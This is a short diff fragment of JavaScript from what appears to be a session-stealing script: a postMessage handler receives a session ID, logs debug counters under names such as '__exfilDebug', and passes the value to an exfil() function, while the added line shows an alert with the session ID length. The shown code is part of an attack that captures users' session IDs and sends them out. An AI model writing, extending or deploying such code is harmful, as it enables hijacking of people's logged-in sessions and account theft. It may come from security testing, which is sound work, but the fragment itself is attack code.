@@ -46,6 +46,7 @@
             if (debug) {
                 window.__exfilDebug.messageReceived++;
                 console.log('[exfil] postMessage received, sid length=' + (e.data.value && String(e.data.value).length), 'Total messageReceived:', window.__exfilDebug.messageReceived);
+                alert('Script received session ID from postMessage (length: ' + (sid ? sid.length : 0) + ')');
             }
             exfil(String(e.data.value).trim());
         }
